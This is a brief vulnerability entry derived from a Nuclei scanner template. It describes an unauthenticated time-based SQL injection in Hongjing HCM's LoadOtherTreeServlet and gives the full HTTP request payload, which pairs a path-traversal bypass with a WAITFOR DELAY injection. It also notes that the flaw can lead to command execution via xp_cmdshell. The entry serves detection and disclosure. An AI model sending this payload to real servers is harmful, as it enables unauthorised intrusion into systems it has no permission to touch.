# Vulnerability: Hongjing HCM - Time-Based Sql Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`hjsoft-hcm-tb-sqli.yaml`)

## Description
There is a SQL injection vulnerability in the /gz/LoadOtherTreeServlet interface of Hongjing HCM. Unauthenticated remote attackers can use the SQL injection vulnerability with the database xp_cmdshell to execute arbitrary commands and control the server. After analysis and judgment, the vulnerability is easy to exploit and it is recommended to be fixed as soon as possible.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 20s
GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A6%27--&flag=1 HTTP/1.1
Host: {{Hostname}}
```

